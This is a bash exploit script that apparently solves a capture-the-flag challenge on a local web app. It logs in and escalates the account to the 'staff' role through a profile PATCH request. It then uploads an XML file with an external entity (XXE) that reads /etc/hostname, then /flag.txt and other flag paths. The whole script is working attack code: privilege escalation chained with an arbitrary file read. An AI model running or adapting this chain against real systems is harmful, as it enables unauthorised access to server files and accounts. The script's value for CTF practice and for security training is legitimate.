#!/bin/bash
# Escalate to staff, then test XXE with /etc/hostname, then read /flag.txt.

USER="jdoe@student.42.tech"
PASS="abc123"
COOKIES="/tmp/xxe_staff_cookies"

# 1. Login & escalate
curl -c "$COOKIES" -b "$COOKIES" -s -L \
  --data-urlencode "identity=$USER" \
  --data-urlencode "password=$PASS" \
  http://localhost:4942/login > /dev/null

curl -s -X PATCH http://localhost:4942/api/profile \
  -H "Content-Type: application/json" \
  -b "$COOKIES" \
  -d '{"role": "staff"}' > /dev/null

# 2. Build XXE payload for /etc/hostname
cat > /tmp/xxe_test.xml <<EOF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<agenda>
  <event>
    <title>&xxe;</title>
    <date>2042-01-01</date>
  </event>
</agenda>
EOF

# 3. Send
RESP=$(curl -s -b "$COOKIES" -X POST http://localhost:4942/agenda/import -F "file=@/tmp/xxe_test.xml")
HOSTNAME=$(echo "$RESP" | grep -oP '<td class="td-primary">\K[^<]+' | head -1)

if [ -n "$HOSTNAME" ]; then
    echo "[+] XXE works with staff! Hostname: $HOSTNAME"

    # 4. Now read the flag
    sed "s|/etc/hostname|/flag.txt|" /tmp/xxe_test.xml > /tmp/xxe_flag.xml
    FLAG_RESP=$(curl -s -b "$COOKIES" -X POST http://localhost:4942/agenda/import -F "file=@/tmp/xxe_flag.xml")
    FLAG=$(echo "$FLAG_RESP" | grep -oP '<td class="td-primary">\K[^<]+' | head -1)

    if [ -n "$FLAG" ]; then
        echo "[+] Flag: $FLAG"
    else
        echo "[-] No flag in /flag.txt. Trying other locations..."
        for path in /flag /home/flag /root/flag.txt; do
            sed "s|/etc/hostname|$path|" /tmp/xxe_test.xml > /tmp/xxe_flag.xml
            RESP2=$(curl -s -b "$COOKIES" -X POST http://localhost:4942/agenda/import -F "file=@/tmp/xxe_flag.xml")
            FLAG2=$(echo "$RESP2" | grep -oP '<td class="td-primary">\K[^<]+' | head -1)
            [ -n "$FLAG2" ] && echo "[+] Flag at $path: $FLAG2" && break
        done
    fi
else
    echo "[-] Still no entity resolution. Staff role didn't change the parser."
    echo "    Full response saved to /tmp/xxe_response.html"
    echo "$RESP" > /tmp/xxe_response.html
fi

rm -f /tmp/xxe_test.xml /tmp/xxe_flag.xml /tmp/xxe_staff_cookies